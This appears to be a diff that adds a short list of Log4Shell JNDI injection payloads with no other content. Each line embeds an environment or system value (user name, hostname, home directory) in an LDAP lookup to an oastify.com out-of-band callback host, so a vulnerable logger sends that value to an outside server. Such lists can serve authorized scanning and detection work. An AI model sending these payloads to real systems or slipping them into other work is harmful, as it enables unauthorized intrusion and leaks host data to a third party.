@@ -1,0 +1,4 @@
+${jndi:ldap://${env:USER:-x}.2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/e_env_user}
+${jndi:ldap://${sys:user.name}.2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/e_sys_user}
+${jndi:ldap://${env:HOSTNAME}.2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/e_hostname}
+${jndi:ldap://${env:HOME:-/}.2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/e_home}
